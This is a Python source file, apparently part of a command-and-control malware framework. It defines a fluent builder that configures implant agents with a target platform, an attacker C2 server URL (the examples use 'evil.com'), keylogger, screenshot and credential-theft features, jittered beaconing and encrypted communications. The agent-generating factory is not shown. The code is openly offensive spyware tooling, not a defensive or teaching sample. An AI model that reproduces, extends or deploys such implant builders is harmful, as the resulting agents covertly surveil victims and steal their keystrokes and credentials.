"""
Agent Builder - BUILDER PATTERN

Constructs agents with many optional configurations.

Why Builder Pattern?
- Too many parameters for constructor
- Makes configuration readable
- Easy to add new options

Usage:
    builder = AgentBuilder()
    config = (builder
        .set_platform("windows")
        .set_c2_server("https://evil.com")
        .add_feature("keylogger")
        .enable_encryption()
        .set_beacon(sleep_time=60, jitter=0.2)
        .build()
    )
"""

from typing import List, Optional, Dict, Any
import uuid
import os

from app.services.agent_factory import AgentFactory


class AgentBuilder:
    """
    Builder for agent configuration.
    
    Step-by-step agent configuration with fluent interface.
    Each method returns self, allowing method chaining.
    """
    
    def __init__(self):
        """Initialize builder with default configuration"""
        self._config = {
            # Required
            "platform": None,
            "c2_server": None,
            
            # Agent identification
            "agent_id": str(uuid.uuid4())[:8],
            
            # Features
            "features": [],
            
            # Beacon configuration
            "sleep_interval": 60,
            "jitter": 0.0,
            
            # Encryption
            "encryption_enabled": False,
            "encryption_key": None,
            
            # Communication
            "protocol": "http",
            
            # Output
            "output_format": "python",  # or "exe" (requires PyInstaller)
        }
    
    # ============================================
    # REQUIRED SETTINGS
    # ============================================
    
    def set_platform(self, platform: str) -> 'AgentBuilder':
        """
        Set target platform.
        
        Args:
            platform: 'windows', 'linux', or 'macos'
        
        Returns:
            self (for method chaining)
        """
        self._config["platform"] = platform
        return self
    
    def set_c2_server(self, server_url: str) -> 'AgentBuilder':
        """
        Set C2 server URL.
        
        Args:
            server_url: Full URL (e.g., 'https://evil.com/api/v1/agents')
        
        Returns:
            self
        """
        self._config["c2_server"] = server_url
        return self
    
    # ============================================
    # AGENT IDENTIFICATION
    # ============================================
    
    def set_agent_id(self, agent_id: str) -> 'AgentBuilder':
        """
        Set custom agent ID.
        
        If not set, a random ID is generated.
        """
        self._config["agent_id"] = agent_id
        return self
    
    # ============================================
    # FEATURES
    # ============================================
    
    def add_feature(self, feature: str) -> 'AgentBuilder':
        """
        Add a feature to the agent.
        
        Args:
            feature: 'keylogger', 'screenshot', 'credentials', etc.
        
        Returns:
            self
        """
        if feature not in self._config["features"]:
            self._config["features"].append(feature)
        return self
    
    def add_features(self, features: List[str]) -> 'AgentBuilder':
        """
        Add multiple features at once.
        
        Args:
            features: List of feature names
        
        Returns:
            self
        """
        for feature in features:
            self.add_feature(feature)
        return self
    
    def remove_feature(self, feature: str) -> 'AgentBuilder':
        """Remove a feature from the agent"""
        if feature in self._config["features"]:
            self._config["features"].remove(feature)
        return self
    
    # ============================================
    # BEACON CONFIGURATION
    # ============================================
    
    def set_beacon(self, sleep_interval: int, jitter: float = 0.0) -> 'AgentBuilder':
        """
        Configure beacon behavior.
        
        Args:
            sleep_interval: Time between beacons (seconds)
            jitter: Random variation (0.0 to 1.0)
        
        Example:
            .set_beacon(sleep_interval=60, jitter=0.2)
            # Agent beacons every 48-72 seconds (60 ± 20%)
        
        Returns:
            self
        """
        self._config["sleep_interval"] = sleep_interval
        self._config["jitter"] = jitter
        return self
    
    # ============================================
    # ENCRYPTION
    # ============================================
    
    def enable_encryption(self, key: Optional[str] = None) -> 'AgentBuilder':
        """
        Enable encryption for agent communications.
        
        Args:
            key: Encryption key (generated if not provided)
        
        Returns:
            self
        """
        self._config["encryption_enabled"] = True
        if key:
            self._config["encryption_key"] = key
        else:
            # Generate random key
            import base64
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            key = AESGCM.generate_key(bit_length=256)
            self._config["encryption_key"] = base64.b64encode(key).decode()
        return self
    
    def disable_encryption(self) -> 'AgentBuilder':
        """Disable encryption"""
        self._config["encryption_enabled"] = False
        return self
    
    # ============================================
    # OUTPUT FORMAT
    # ============================================
    
    def set_output_format(self, format: str) -> 'AgentBuilder':
        """
        Set output format.
        
        Args:
            format: 'python' or 'exe'
        
        Returns:
            self
        """
        self._config["output_format"] = format
        return self
    
    # ============================================
    # BUILD
    # ============================================
    
    def build(self) -> Dict[str, Any]:
        """
        Build and return the final configuration.
        
        Validates configuration and returns a dictionary
        that can be used to generate the agent.
        
        Returns:
            Configuration dictionary
        
        Raises:
            ValueError: If required fields are missing
        """
        
        # Validate required fields
        if not self._config["platform"]:
            raise ValueError("Platform must be set (use .set_platform())")
        
        if not self._config["c2_server"]:
            raise ValueError("C2 server must be set (use .set_c2_server())")
        
        # Validate platform
        if self._config["platform"] not in AgentFactory.get_supported_platforms():
            raise ValueError(f"Unsupported platform: {self._config['platform']}")
        
        # Validate features
        available_features = AgentFactory.get_features_for_platform(
            self._config["platform"]
        )
        for feature in self._config["features"]:
            if feature not in available_features:
                raise ValueError(
                    f"Feature '{feature}' not available for {self._config['platform']}. "
                    f"Available: {', '.join(available_features)}"
                )
        
        # Validate jitter
        if not 0 <= self._config["jitter"] <= 1:
            raise ValueError("Jitter must be between 0 and 1")
        
        # Return a copy of the configuration
        return self._config.copy()
    
    def get_config(self) -> Dict[str, Any]:
        """
        Get current configuration without validation.
        
        Useful for previewing configuration before building.
        """
        return self._config.copy()